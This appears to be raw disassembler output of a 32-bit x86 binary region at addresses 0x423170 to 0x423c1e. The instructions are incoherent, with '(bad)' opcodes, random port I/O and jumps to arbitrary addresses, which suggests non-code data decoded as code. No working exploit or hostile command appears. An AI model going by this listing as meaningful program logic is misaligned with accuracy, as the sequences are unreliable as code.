  423170:	cmova  ebx,DWORD PTR [edi]
  423173:	sbb    al,0x9b
  423175:	push   ds
  423176:	add    dl,BYTE PTR [edi-0x9]
  423179:	mul    edi
  42317b:	xlat   BYTE PTR ds:[ebx]
  42317c:	rcr    dl,1
  42317e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42317f:	or     eax,0x29451801
  423184:	adc    ch,BYTE PTR [eax]
  423186:	or     edi,DWORD PTR [ebx]
  423188:	cs iret 
  42318a:	mov    edx,0x967fcd64
  42318f:	in     al,0x89
  423191:	or     al,0x3d
  423193:	rcl    dl,1
  423195:	stc    
  423196:	inc    esi
  423197:	pop    edi
  423198:	(bad)  
  423199:	loopne 0x423138
  42319b:	pop    esi
  42319c:	sub    al,0x91
  42319e:	jbe    0x42317f
  4231a0:	test   edx,ecx
  4231a2:	fimul  DWORD PTR ds:0x11bfd9b6
  4231a8:	mov    cl,0xc
  4231aa:	cdq    
  4231ab:	pop    ds
  4231ac:	push   ebx
  4231ad:	fisttp DWORD PTR [eax-0x2332b35]
  4231b3:	sub    ah,0xd1
  4231b6:	fisttp WORD PTR [ebx-0x35]
  4231b9:	int    0x11
  4231bb:	dec    esp
  4231bc:	shl    ch,cl
  4231be:	lods   al,BYTE PTR ds:[esi]
  4231bf:	loope  0x423196
	...
  423231:	add    BYTE PTR [eax],al
  423233:	add    BYTE PTR [edi-0x10085213],cl
  423239:	neg    edi
  42323b:	std    
  42323c:	stc    
  42323d:	idiv   DWORD PTR ds:0xa9b900b0
  423243:	jne    0x423249
  423245:	ja     0x423248
  423247:	add    ch,dh
  423249:	add    BYTE PTR [eax],al
  42324b:	add    BYTE PTR [ecx-0x483cbf62],bh
  423251:	mov    ds:0x78e95bea,al
  423256:	cmp    DWORD PTR [ebp+0x26],ebp
  423259:	sub    ch,BYTE PTR ds:0x2e765b96
  42325f:	mov    ds:0x24d25557,eax
  423264:	mov    ecx,DWORD PTR [esi-0x78a0a967]
  42326a:	pop    edi
  42326b:	inc    ebx
  42326c:	jo     0x4232b2
  42326e:	jp     0x4232d1
  423270:	or     DWORD PTR [esi],0x50d2888a
  423276:	test   BYTE PTR [esi+0x61d53e50],dl
  42327c:	push   ss
  42327d:	sub    dh,BYTE PTR [ecx+ebx*8-0x6d9dd191]
  423284:	sbb    ah,BYTE PTR [edx-0x1b105031]
  42328a:	jl     0x4232e0
  42328c:	bound  esp,QWORD PTR [esi-0x2f454369]
  423292:	je     0x42328f
  423294:	lea    ebp,[ebx+ecx*4-0x50]
  423298:	sbb    cl,ch
  42329a:	aas    
  42329b:	fcom   QWORD PTR [ebp-0x30]
  42329e:	cld    
  42329f:	repnz loopne 0x4232fc
  4232a2:	mov    fs:0x51102ea6,eax
  4232a8:	sti    
  4232a9:	and    BYTE PTR [edx+0x7a],cl
  4232ac:	fwait
  4232ad:	pop    edi
  4232ae:	dec    ecx
  4232af:	pop    es
  4232b0:	(bad)  
  4232b1:	adc    eax,0xb35297b6
  4232b6:	xchg   esi,eax
  4232b7:	in     al,0xb2
  4232b9:	mov    bl,0xdb
  4232bb:	shr    DWORD PTR [edx-0x55],cl
  4232be:	xor    edi,0xfffffff4
  4232c1:	pushf  
  4232c2:	mov    ah,0xb9
  4232c4:	dec    ebx
  4232c5:	cmp    DWORD PTR [ebp+0x46],esp
  4232c8:	hlt    
  4232c9:	mov    eax,0xba1f8f19
  4232ce:	dec    esi
  4232cf:	dec    ebx
  4232d0:	jo     0x4232d3
  4232d2:	shl    cl,1
  4232d4:	int3   
  4232d5:	cld    
  4232d6:	dec    edx
  4232d7:	mov    dl,0xa
  4232d9:	mov    esp,ss
  4232db:	jo     0x42327f
  4232dd:	adc    eax,0x5a6abe10
  4232e2:	out    dx,al
  4232e3:	fdiv   st(0),st
  4232e5:	lods   al,BYTE PTR ds:[si]
  4232e7:	int    0x5b
  4232e9:	ins    BYTE PTR es:[edi],dx
  4232ea:	test   eax,0x4b7d56a6
  4232ef:	mov    dh,0x43
  4232f1:	out    dx,al
  4232f2:	aas    
  4232f3:	xor    ch,cl
  4232f5:	pop    edi
  4232f6:	ret    0xd709
  4232f9:	std    
  4232fa:	dec    DWORD PTR [edi]
  4232fc:	popa   
  4232fd:	and    eax,0x32a53fa2
  423302:	jnp    0x423352
  423304:	push   ds
  423305:	push   ds
  423306:	clc    
  423307:	xlat   BYTE PTR ds:[ebx]
  423308:	xor    eax,0x26b7b424
  42330d:	inc    esi
  42330e:	xchg   esp,eax
  42330f:	test   DWORD PTR [ebp-0x4c462329],esi
  423315:	dec    ebx
  423316:	ret    0xff30
  423319:	adc    eax,DWORD PTR [edi-0x3b]
  42331c:	test   eax,0x7b486dc6
  423321:	sbb    edx,ebp
  423323:	push   edx
  423324:	mov    ebx,0xa3f61e17
  423329:	push   ebp
  42332a:	inc    esi
  42332b:	rcl    DWORD PTR [ebx+0x6d],cl
  42332e:	outs   dx,DWORD PTR ds:[esi]
  42332f:	ins    BYTE PTR es:[edi],dx
  423330:	(bad)  
  423331:	das    
  423332:	push   eax
  423333:	xor    ebx,edi
  423335:	jge    0x42332d
  423337:	out    dx,eax
  423338:	add    ebp,DWORD PTR [eax+edx*4-0x16]
  42333c:	mov    dl,0xcf
  42333e:	addr16 jp 0x4233a0
	...
  4233b1:	add    BYTE PTR [eax],al
  4233b3:	add    BYTE PTR [edx-0x7e],dl
  4233b6:	cs imul edi,esi,0x4bb57ed
  4233bd:	mov    eax,ds:0xf8168e4a
  4233c2:	ss jge 0x4233be
  4233c5:	ja     0x4233c8
  4233c7:	add    ch,dh
  4233c9:	add    BYTE PTR [eax],al
  4233cb:	add    BYTE PTR [eax+eiz*4+0x78721f1d],bh
  4233d2:	or     ecx,ebx
  4233d4:	push   eax
  4233d5:	jmp    0x7acac968
  4233da:	cwde   
  4233db:	pop    eax
  4233dc:	cld    
  4233dd:	mov    WORD PTR [ebp-0x21],?
  4233e0:	fs dec edi
  4233e2:	(bad)  [ebx-0x11bcab6f]
  4233e8:	es je  0x423425
  4233eb:	add    dh,BYTE PTR ds:0xb06ef7e4
  4233f1:	sub    DWORD PTR [esi-0x17709ae0],edx
  4233f7:	pop    esi
  4233f8:	jmp    0xff6224d
  4233fd:	hlt    
  4233fe:	imul   edx,DWORD PTR [edx-0x688918b1],0xffffff97
  423405:	cmc    
  423406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423407:	push   esi
  423408:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423409:	push   es
  42340a:	imul   ebp,DWORD PTR [edi-0x4d],0xffffffaa
  42340e:	shr    DWORD PTR ds:0x73f54d68,0x62
  423415:	out    0x96,al
  423417:	xchg   ecx,eax
  423418:	xchg   edx,eax
  423419:	inc    edx
  42341a:	fs scas al,BYTE PTR es:[edi]
  42341c:	or     ecx,DWORD PTR [edx-0x4d]
  42341f:	cmp    esi,DWORD PTR [eax]
  423421:	push   edi
  423422:	mov    ecx,0x1f3b7587
  423427:	(bad)  
  423428:	push   esi
  423429:	cmp    BYTE PTR [eax+0x5a82f5f4],ch
  42342f:	lods   eax,DWORD PTR ds:[esi]
  423430:	jns    0x4233c2
  423432:	adc    ebx,ecx
  423434:	sbb    eax,0xac92929c
  423439:	mov    esi,eax
  42343b:	outs   dx,DWORD PTR ds:[esi]
  42343c:	fs adc eax,0x96c0f4bd
  423442:	push   esi
  423443:	inc    edx
  423444:	jle    0x42348c
  423446:	xchg   esp,eax
  423447:	inc    ebp
  423448:	jmp    0xacf4cfb3
  42344d:	xchg   esi,eax
  42344e:	ins    DWORD PTR es:[edi],dx
  42344f:	lds    ebp,FWORD PTR [ecx+0x1ffc1c31]
  423455:	mov    ecx,0xb51e7206
  42345a:	dec    edi
  42345b:	and    al,0x70
  42345d:	jne    0x42342c
  42345f:	in     eax,0x8d
  423461:	push   ebp
  423462:	fisubr WORD PTR [ebx-0x636becab]
  423468:	jns    0x423401
  42346a:	or     DWORD PTR [ebx],esi
  42346c:	out    dx,eax
  42346d:	jno    0x423452
  42346f:	outs   dx,DWORD PTR ds:[esi]
  423470:	xchg   ecx,eax
  423471:	and    esi,edi
  423473:	test   al,0x59
  423475:	cmp    DWORD PTR [esi],eax
  423477:	push   edx
  423478:	mov    DWORD PTR es:[esi],ebp
  42347b:	jg     0x42345c
  42347d:	push   eax
  42347e:	and    BYTE PTR [edi+edx*1+0x7c],bl
  423482:	mov    cl,0xa9
  423484:	add    al,0x77
  423486:	cmp    bh,al
  423488:	push   edx
  423489:	sbb    BYTE PTR [edi-0x5eaae9da],bl
  42348f:	mov    ah,0x1f
  423491:	xor    edi,DWORD PTR [ecx]
  423493:	and    eax,0xb3808cf8
  423498:	adc    eax,edi
  42349a:	icebp  
  42349b:	stos   DWORD PTR es:[edi],eax
  42349c:	stos   DWORD PTR es:[edi],eax
  42349d:	mov    dh,0x63
  42349f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234a0:	lea    esp,[edx-0x6c]
  4234a3:	loopne 0x4234f5
  4234a5:	inc    ecx
  4234a6:	push   es
  4234a7:	sbb    al,0xa1
  4234a9:	aaa    
  4234aa:	sahf   
  4234ab:	xchg   esi,eax
  4234ac:	inc    ebp
  4234ad:	mov    WORD PTR [ecx+0x32],?
  4234b0:	repnz sbb eax,0x981b5b9
  4234b6:	popf   
  4234b7:	mov    bh,0x64
  4234b9:	adc    BYTE PTR [ebx+0x5c7a9ee2],dl
  4234bf:	add    BYTE PTR [esi],0x0
	...
  423532:	add    BYTE PTR [eax],al
  423534:	call   0xfa77:0xbf778fae
  42353b:	out    dx,eax
  42353c:	dec    ebx
  42353d:	jg     0x4234d2
  42353f:	aad    0x7b
  423541:	lea    ebx,[ebp+0x27]
  423544:	out    dx,al
  423545:	js     0x423548
  423547:	add    ch,dh
  423549:	add    BYTE PTR [eax],al
  42354b:	add    BYTE PTR [ebx],dl
  42354d:	xlat   BYTE PTR ds:[ebx]
  42354e:	popa   
  42354f:	sub    DWORD PTR [esi-0x2b],esp
  423552:	pop    ds
  423553:	bound  ebp,QWORD PTR [eax+0x4abe770a]
  423559:	ret    
  42355a:	mov    edx,0xebfb5546
  42355f:	in     eax,0x80
  423561:	leave  
  423562:	js     0x4234ec
  423564:	rcl    DWORD PTR [edx-0x20],cl
  423567:	mov    WORD PTR [edx+0x7e],fs
  42356a:	repnz push ecx
  42356c:	jo     0x423538
  42356e:	bound  edx,QWORD PTR [esi]
  423570:	xor    edi,DWORD PTR [ecx-0x6adcb5bf]
  423576:	mov    BYTE PTR [edx-0x7f],al
  423579:	pop    esp
  42357a:	ss sub cl,dl
  42357d:	mov    ebp,DWORD PTR ds:0xe992b7c6
  423583:	ins    BYTE PTR es:[edi],dx
  423584:	fisttp QWORD PTR [edi-0x1a]
  423587:	and    ecx,ebx
  423589:	push   eax
  42358a:	cmp    dl,BYTE PTR [edi+0x1d]
  42358d:	dec    edi
  42358e:	jecxz  0x423565
  423590:	or     edi,DWORD PTR [esi+esi*2]
  423593:	ret    0x170e
  423596:	inc    ebx
  423597:	mov    edx,0xf995f06e
  42359c:	cld    
  42359d:	sub    ah,dh
  42359f:	adc    eax,0x2510b043
  4235a4:	push   ebp
  4235a5:	ins    BYTE PTR es:[edi],dx
  4235a6:	mov    WORD PTR [ebp-0x72bf06c7],es
  4235ac:	pop    ss
  4235ad:	jb     0x423568
  4235af:	xor    dl,dl
  4235b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235b2:	dec    ecx
  4235b3:	sbb    ch,BYTE PTR [ebx-0x6455b2c7]
  4235b9:	jb     0x423615
  4235bb:	jns    0x423588
  4235bd:	sub    esi,edi
  4235bf:	loopne 0x423586
  4235c1:	push   edi
  4235c2:	or     BYTE PTR [eax+0x44],cl
  4235c5:	scas   al,BYTE PTR es:[edi]
  4235c6:	jl     0x423597
  4235c8:	add    DWORD PTR [esi-0x2a1eb5c9],ebx
  4235ce:	in     al,0x2d
  4235d0:	dec    eax
  4235d1:	pop    esp
  4235d2:	xor    BYTE PTR [esi+0x12],0x80
  4235d6:	ficomp DWORD PTR ds:0x4b634bd7
  4235dc:	push   esi
  4235dd:	sti    
  4235de:	xchg   edx,eax
  4235df:	xor    ebp,ebp
  4235e1:	dec    ebx
  4235e2:	cmp    ch,al
  4235e4:	push   ebp
  4235e5:	into   
  4235e6:	pop    ecx
  4235e7:	sbb    DWORD PTR [eax+eax*1-0x33],edx
  4235eb:	adc    ah,dh
  4235ed:	stos   DWORD PTR es:[edi],eax
  4235ee:	mov    esi,0xf52b2ce8
  4235f3:	push   eax
  4235f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235f5:	mov    al,0xa
  4235f7:	dec    ebx
  4235f8:	jno    0x423599
  4235fa:	mov    dl,0xea
  4235fc:	mov    dl,0xb0
  4235fe:	mov    ch,0xaf
  423600:	(bad)  
  423601:	lahf   
  423602:	clc    
  423603:	aam    0xe3
  423605:	sbb    dl,BYTE PTR [edx]
  423607:	lahf   
  423608:	cmp    eax,0x1920f93c
  42360d:	dec    edx
  42360e:	daa    
  42360f:	push   eax
  423610:	inc    ecx
  423611:	jbe    0x423619
  423613:	inc    ebx
  423614:	out    0x75,eax
  423616:	xor    BYTE PTR [ebx-0x33],ah
  423619:	arpl   si,sp
  42361b:	inc    eax
  42361c:	mov    cl,0xc5
  42361e:	xchg   cl,al
  423620:	pusha  
  423621:	lahf   
  423622:	loopne 0x4235b2
  423624:	shl    ch,1
  423626:	push   es
  423627:	push   eax
  423628:	push   es
  423629:	or     DWORD PTR [edx+esi*4-0x67],0x8178decc
  423631:	mov    ebx,0x7cfa7612
  423636:	test   eax,0xaf89626d
  42363b:	aas    
  42363c:	or     esp,DWORD PTR [esi-0x6c]
  42363f:	fsub   QWORD PTR [eax+0x0]
	...
  4236b2:	add    BYTE PTR [eax],al
  4236b4:	daa    
  4236b5:	sub    eax,0x7d7f2d7d
  4236ba:	ja     0x4236eb
  4236bc:	mov    cl,ah
  4236be:	paddq  mm5,mm4
  4236c1:	pop    esp
  4236c2:	inc    edx
  4236c3:	outs   dx,BYTE PTR ds:[esi]
  4236c4:	jecxz  0x42373f
  4236c6:	add    DWORD PTR [eax],eax
  4236c8:	cmc    
  4236c9:	add    BYTE PTR [eax],al
  4236cb:	add    bl,cl
  4236cd:	mov    cl,0x65
  4236cf:	cmp    edx,edx
  4236d1:	xchg   BYTE PTR [edi+0x6f],cl
  4236d4:	mov    bl,0x43
  4236d6:	jnp    0x4236a5
  4236d8:	push   eax
  4236d9:	sub    ah,bl
  4236db:	aaa    
  4236dc:	bound  ecx,QWORD PTR [edi-0x7f]
  4236df:	enter  0x2130,0xc6
  4236e3:	jae    0x4236f1
  4236e5:	adc    al,0x80
  4236e7:	pop    ss
  4236e8:	pop    ebx
  4236e9:	(bad)  
  4236ea:	inc    BYTE PTR [edx+ebp*8]
  4236ed:	mov    BYTE PTR [esi+0xeab5c61],dh
  4236f3:	lods   al,BYTE PTR ds:[esi]
  4236f4:	cmc    
  4236f5:	fild   WORD PTR [esi]
  4236f7:	xor    DWORD PTR [edi],esp
  4236f9:	jmp    0xca9d2be9
  4236fe:	mov    ah,0x17
  423700:	popa   
  423701:	mov    edi,0x1ad8d9e0
  423706:	test   ebp,edi
  423708:	pop    eax
  423709:	aad    0xce
  42370b:	call   0x851f7b06
  423710:	push   ebp
  423711:	sub    BYTE PTR [esi+ebx*2],0x88
  423715:	sahf   
  423716:	ins    BYTE PTR es:[edi],dx
  423717:	add    dl,BYTE PTR [edi]
  423719:	imul   ebp,DWORD PTR ds:[ebp-0x54],0x40
  42371e:	cdq    
  42371f:	mov    dl,0x60
  423721:	out    dx,eax
  423722:	pop    esp
  423723:	xor    BYTE PTR [ebp+0x1e],bh
  423726:	sbb    ecx,esp
  423728:	cli    
  423729:	imul   ecx,DWORD PTR [esi+0x3a089363],0xfc07dc2c
  423733:	inc    esp
  423734:	fidiv  WORD PTR ds:0x57ea95a3
  42373a:	rcr    BYTE PTR [ecx-0x3791a45f],0xaf
  423741:	adc    eax,0xfcab0f1f
  423746:	pop    ebp
  423747:	popa   
  423748:	adc    BYTE PTR [ebx],al
  42374a:	and    DWORD PTR [edi],ebp
  42374c:	xlat   BYTE PTR ds:[ebx]
  42374d:	push   edi
  42374e:	repz jl 0x42376b
  423751:	pop    eax
  423752:	call   0xf2ca900a
  423757:	xchg   ebp,eax
  423758:	push   edx
  423759:	int3   
  42375a:	jg     0x4237c0
  42375c:	or     al,0xb8
  42375e:	(bad)  
  42375f:	pop    ecx
  423760:	test   al,0xc5
  423762:	sbb    BYTE PTR [edx],ch
  423764:	popf   
  423765:	outs   dx,BYTE PTR ds:[esi]
  423766:	xor    eax,0xf9ef1085
  42376b:	sbb    ebx,0xf1993b84
  423771:	jle    0x423750
  423773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423774:	repz cdq 
  423776:	mov    WORD PTR ds:0xf0c4f1d5,ss
  42377c:	adc    edi,ebp
  42377e:	jne    0x423714
  423780:	fidiv  WORD PTR [eax+0x35]
  423783:	mov    eax,ds:0x1bbb83d9
  423788:	pop    es
  423789:	jb     0x4237e4
  42378b:	ins    BYTE PTR es:[edi],dx
  42378c:	sub    dl,ch
  42378e:	and    BYTE PTR [ecx-0x371aa176],ch
  423794:	xchg   edi,eax
  423795:	ins    DWORD PTR es:[edi],dx
  423796:	ror    edi,1
  423798:	mov    al,BYTE PTR [ecx-0x42]
  42379b:	jle    0x4237f8
  42379d:	addr16 xchg edi,eax
  42379f:	ss sbb al,0xdc
  4237a2:	leave  
  4237a3:	mov    eax,0xe9953e3f
  4237a8:	into   
  4237a9:	jne    0x2dc2b8b9
  4237af:	cli    
  4237b0:	mov    edi,0xe7f1203d
  4237b5:	xor    DWORD PTR [ecx-0x639473f3],ecx
  4237bb:	mov    DWORD PTR [edx-0x8],0x3e555a
	...
  423832:	add    BYTE PTR [eax],al
  423834:	int    0x39
  423836:	mov    eax,0xef97fc97
  42383b:	jnp    0x423814
  42383d:	jge    0x4238a4
  42383f:	xchg   ecx,eax
  423840:	out    0xa6,al
  423842:	xchg   dl,al
  423844:	fdivr  DWORD PTR [edx+0x1]
  423847:	add    ch,dh
  423849:	add    BYTE PTR [eax],al
  42384b:	add    BYTE PTR [esi+0x62],cl
  42384e:	and    BYTE PTR [ecx],0x15
  423851:	rol    DWORD PTR [esi],0xaa
  423854:	adc    DWORD PTR [ebp-0x47],eax
  423857:	xchg   ch,ch
  423859:	aam    0x7d
  42385b:	das    
  42385c:	dec    ebx
  42385d:	loope  0x423806
  42385f:	xor    ah,BYTE PTR [eax+0x70]
  423862:	out    0x40,eax
  423864:	pusha  
  423865:	cli    
  423866:	mov    ds:0x6c0486e3,eax
  42386b:	das    
  42386c:	enter  0x93da,0x96
  423870:	addr16 mov eax,ds:0x7cff
  423874:	xchg   ecx,eax
  423875:	adc    DWORD PTR gs:[eax-0x23],0xf5763569
  42387d:	adc    DWORD PTR [eax-0x57],0x36d312be
  423884:	mov    esi,0x2169519d
  423889:	rep stos DWORD PTR es:[edi],eax
  42388b:	or     al,0xa8
  42388d:	push   cs
  42388e:	(bad)  
  423890:	mov    ch,0xfb
  423892:	mov    bl,0xf1
  423894:	cmp    DWORD PTR [eax],esp
  423896:	xchg   BYTE PTR [ecx],dl
  423898:	xor    eax,0x25c0a7c
  42389d:	bound  esp,QWORD PTR [edi+edx*2+0x33]
  4238a1:	inc    esi
  4238a2:	es hlt 
  4238a4:	outs   dx,BYTE PTR ds:[esi]
  4238a5:	jecxz  0x4238b3
  4238a7:	cmp    eax,0xd6ed7030
  4238ac:	mov    ebp,0x74bc3d88
  4238b1:	sbb    edx,DWORD PTR [ecx+0x550666d4]
  4238b7:	mov    ds,WORD PTR [eax+0x69]
  4238ba:	dec    ebp
  4238bb:	or     edi,DWORD PTR [ebp+0x7fc2b8d9]
  4238c1:	les    ebp,FWORD PTR ds:0xceb6b229
  4238c7:	outs   dx,BYTE PTR ds:[esi]
  4238c8:	pop    edx
  4238c9:	mov    ecx,0xf75ab0bb
  4238ce:	ds add eax,0x7e2bd8f7
  4238d4:	mov    ah,BYTE PTR [ebp-0x5cb12817]
  4238da:	mov    eax,ds:0x9a3a415d
  4238df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238e0:	daa    
  4238e1:	stos   DWORD PTR es:[edi],eax
  4238e2:	add    BYTE PTR [eax-0x4c],dh
  4238e5:	int    0x4d
  4238e7:	fidiv  DWORD PTR [eax+0x4d]
  4238ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238eb:	cli    
  4238ec:	mov    ebp,0x2bff2a0a
  4238f1:	outs   dx,DWORD PTR ds:[esi]
  4238f2:	cmp    eax,0x4b43cee5
  4238f7:	rcr    DWORD PTR [edx],1
  4238f9:	push   ebx
  4238fa:	xchg   ebx,eax
  4238fb:	pop    ecx
  4238fc:	sub    eax,0x134bd186
  423901:	retf   0x693d
  423904:	pop    eax
  423905:	xor    al,0x4c
  423907:	pusha  
  423908:	dec    esi
  423909:	arpl   WORD PTR [esi+eax*2-0x113f3ea9],dx
  423910:	push   cs
  423911:	je     0x423953
  423913:	and    al,0x24
  423915:	and    eax,0xa861668e
  42391a:	push   ebx
  42391b:	xchg   DWORD PTR [eax],edx
  42391d:	call   0xc1c5:0xfac07a14
  423924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423925:	(bad)  
  423926:	push   eax
  423927:	xchg   ebp,eax
  423928:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423929:	shr    dl,cl
  42392b:	push   edx
  42392c:	add    al,0x7e
  42392e:	cmp    al,0xeb
  423930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423931:	mov    dh,0x3f
  423933:	adc    eax,0x4fa19c2e
  423938:	sub    edx,DWORD PTR [edi+0x3fa5e283]
  42393e:	mov    edx,0xbd8f
	...
  4239b3:	add    BYTE PTR [esi-0x377e796],dl
  4239b9:	cli    
  4239ba:	xchg   esi,eax
  4239bb:	jle    0x4239aa
  4239bd:	mov    cl,0x66
  4239bf:	mov    WORD PTR [ebp-0x16],ds
  4239c2:	add    BYTE PTR [ebp+ecx*8-0xafffe85],bl
  4239c9:	add    BYTE PTR [eax],al
  4239cb:	add    BYTE PTR [ebp-0x7dcaacff],ah
  4239d1:	cmp    al,0x33
  4239d3:	ins    DWORD PTR es:[edi],dx
  4239d4:	push   ebx
  4239d5:	mov    ecx,0x5377a5b5
  4239da:	or     eax,0x75e1f6cc
  4239df:	jno    0x423a43
  4239e1:	fstp   QWORD PTR [eax+eiz*1-0xe]
  4239e5:	dec    ebx
  4239e6:	dec    ebp
  4239e7:	fsub   QWORD PTR [esi]
  4239e9:	scas   eax,DWORD PTR es:[edi]
  4239ea:	xor    eax,0x1fb8d5e9
  4239ef:	arpl   di,bx
  4239f1:	inc    ebx
  4239f2:	dec    ebp
  4239f3:	das    
  4239f4:	pushf  
  4239f5:	mov    al,0xe8
  4239f7:	ror    BYTE PTR [ebp-0x80],1
  4239fa:	mov    ah,0xd3
  4239fc:	xlat   BYTE PTR ds:[ebx]
  4239fd:	aad    0x5e
  4239ff:	(bad)  
  423a00:	sahf   
  423a01:	lea    esi,[esp+eiz*4]
  423a04:	push   ecx
  423a05:	adc    al,0xd7
  423a07:	ja     0x4239ec
  423a09:	sbb    eax,0xa1660248
  423a0e:	cmp    bh,BYTE PTR [ebp-0xf]
  423a11:	(bad)  
  423a12:	fisttp DWORD PTR [ecx+0x703c9941]
  423a18:	mov    bh,0x75
  423a1a:	and    DWORD PTR [ebp-0x59],ebp
  423a1d:	cmc    
  423a1e:	fidivr WORD PTR [ecx]
  423a20:	jno    0x423a31
  423a22:	imul   esi,ebx,0x3e
  423a25:	int3   
  423a26:	arpl   WORD PTR [esi+0x2aec6fd5],di
  423a2c:	xchg   ebx,eax
  423a2d:	xchg   edi,eax
  423a2e:	cdq    
  423a2f:	mov    bl,0x23
  423a31:	cld    
  423a32:	cmp    esp,DWORD PTR fs:[ecx-0x4b]
  423a36:	xor    al,BYTE PTR [edx-0x4b6d2e30]
  423a3c:	out    dx,eax
  423a3d:	arpl   WORD PTR [esi],dx
  423a3f:	scas   al,BYTE PTR es:[edi]
  423a40:	jp     0x423a90
  423a42:	fwait
  423a43:	enter  0x770f,0xd9
  423a47:	mov    ebx,0x48364194
  423a4c:	jecxz  0x423aa0
  423a4e:	mov    ds:0xe1a667da,eax
  423a53:	call   FWORD PTR [edi-0x32]
  423a56:	lods   eax,DWORD PTR ds:[esi]
  423a57:	add    BYTE PTR [esi+0x60d31ac0],ah
  423a5d:	dec    edi
  423a5e:	pop    edx
  423a5f:	jmp    0xa417:0x2354e6f7
  423a66:	sbb    ah,0xf7
  423a69:	sbb    cl,cl
  423a6b:	mov    DWORD PTR [ebp-0x39],0x5e4a1722
  423a72:	std    
  423a73:	sbb    BYTE PTR [ecx],bh
  423a75:	jns    0x423a06
  423a77:	or     eax,0xd796d0cd
  423a7c:	push   eax
  423a7d:	jne    0x423adc
  423a7f:	dec    edx
  423a80:	sbb    eax,0x45bc3706
  423a85:	out    0x1a,al
  423a87:	test   dl,cl
  423a89:	pusha  
  423a8a:	pop    eax
  423a8b:	aam    0x48
  423a8d:	and    ecx,edi
  423a8f:	mov    esi,0xfee09154
  423a94:	in     eax,0x89
  423a96:	adc    edi,DWORD PTR [edx]
  423a98:	adc    ebp,ebp
  423a9a:	sub    ch,BYTE PTR [eax+ebx*1]
  423a9d:	cdq    
  423a9e:	stc    
  423a9f:	xor    DWORD PTR [ecx-0x4b1dc94b],edx
  423aa5:	mov    esp,0xe94fbb7c
  423aaa:	sbb    al,ch
  423aac:	(bad)  
  423aad:	push   edi
  423aae:	(bad)  
  423aaf:	pop    edi
  423ab0:	sub    DWORD PTR [eax+0x12007ae7],ecx
  423ab6:	mov    gs,ebp
  423ab8:	fnstcw WORD PTR [ecx+0x45]
  423abb:	fwait
  423abc:	aas    
  423abd:	iret   
  423abe:	or     esp,DWORD PTR [edx+0xfe]
	...
  423b34:	inc    esp
  423b35:	aaa    
  423b36:	dec    edx
  423b37:	fwait
  423b38:	jnp    0x423b39
  423b3a:	aad    0xff
  423b3c:	gs popa 
  423b3e:	into   
  423b3f:	add    al,0x91
  423b41:	test   BYTE PTR [ebx+0x17cc272],cl
  423b47:	add    ch,dh
  423b49:	add    BYTE PTR [eax],al
  423b4b:	add    ah,ah
  423b4d:	loopne 0x423b5c
  423b4f:	xchg   edx,eax
  423b50:	mov    dl,0xda
  423b52:	add    ebx,DWORD PTR [ebx-0x20]
  423b55:	inc    ebp
  423b56:	lods   al,BYTE PTR ds:[esi]
  423b57:	mov    edx,0xe42a4c0e
  423b5c:	mov    al,0x52
  423b5e:	and    ebx,DWORD PTR [ecx]
  423b60:	mov    eax,0xe7a0dcce
  423b65:	cmp    al,0x4a
  423b67:	mov    WORD PTR [edi+ecx*8-0x7d],ds
  423b6b:	inc    esp
  423b6c:	mov    ebx,0x6d49491f
  423b71:	sbb    edi,DWORD PTR [eax-0x37]
  423b74:	push   eax
  423b75:	mov    ebp,0x9b0efb10
  423b7a:	gs push esi
  423b7c:	or     dl,dl
  423b7e:	mov    DWORD PTR [ebp+0x37],0xfcd8265d
  423b85:	rcl    BYTE PTR [edi],0xa9
  423b88:	addr16 mov eax,ds:0x679
  423b8c:	push   0x2f45f54f
  423b91:	push   ebp
  423b92:	jnp    0x423bc2
  423b94:	mov    esi,DWORD PTR [edi+0x26]
  423b97:	inc    edi
  423b98:	sbb    eax,DWORD PTR [ecx+eiz*2+0x2f]
  423b9c:	retf   0x8620
  423b9f:	sub    DWORD PTR [ebx+0x789f3d5d],ebx
  423ba5:	popa   
  423ba6:	mov    WORD PTR ds:[ebx-0x56da1351],fs
  423bad:	loope  0x423bd8
  423baf:	push   ecx
  423bb0:	lods   eax,DWORD PTR ds:[esi]
  423bb1:	push   esi
  423bb2:	or     ah,BYTE PTR [esi]
  423bb4:	dec    edi
  423bb5:	icebp  
  423bb6:	or     ah,ch
  423bb8:	ds mov ch,0x23
  423bbb:	mov    eax,ds:0xf8dd331f
  423bc0:	pop    ebp
  423bc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423bc2:	adc    BYTE PTR [edi+0x196af68a],dh
  423bc8:	lea    ecx,[esi]
  423bca:	push   ecx
  423bcb:	jb     0x423b60
  423bcd:	popa   
  423bce:	(bad)  
  423bcf:	mov    ds:0x3abb67fc,eax
  423bd4:	(bad)  
  423bd5:	dec    ebx
  423bd6:	jae    0x423c49
  423bd8:	cmp    bl,BYTE PTR [esi+0x5f]
  423bdb:	hlt    
  423bdc:	aas    
  423bdd:	adc    DWORD PTR [ecx+0x28],ebp
  423be0:	scas   al,BYTE PTR es:[edi]
  423be1:	mov    edx,0x7071f1e1
  423be6:	xor    al,al
  423be8:	sub    ebp,esp
  423bea:	retf   
  423beb:	lds    edi,FWORD PTR [ecx+0x86ea140]
  423bf1:	lea    esp,[edx+0x766edc4a]
  423bf7:	sbb    ah,BYTE PTR [ecx+0x1f0e2562]
  423bfd:	repz test eax,0xfbe6214c
  423c03:	push   0xffffff82
  423c05:	mov    ah,0xbf
  423c07:	ficom  WORD PTR [esi-0x6e]
  423c0a:	ror    DWORD PTR [eax],1
  423c0c:	enter  0xb8ea,0xcf
  423c10:	dec    edi
  423c11:	retf   
  423c12:	dec    ebx
  423c13:	dec    eax
  423c14:	lahf   
  423c15:	aas    
  423c16:	aad    0x6c
  423c18:	mov    ah,0xa6
  423c1a:	push   edi
  423c1b:	cmp    ecx,DWORD PTR [eax-0x4]
  423c1e:	adc    cl,bh
